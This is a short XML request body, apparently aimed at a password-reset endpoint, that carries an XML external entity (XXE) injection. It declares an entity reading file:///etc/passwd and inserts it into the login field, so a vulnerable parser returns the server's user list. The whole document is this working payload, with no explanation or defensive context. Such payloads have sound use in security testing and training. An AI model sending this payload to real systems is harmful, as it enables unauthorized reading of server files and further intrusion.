
<?xml version="1.0"?>
	<!DOCTYPE foo [ <!ENTITY file  SYSTEM "file:///etc/passwd">]>
	<reset>
		<login>
			&file;
		</login>
		<secret>
			Any bugs?
		</secret>
	</reset>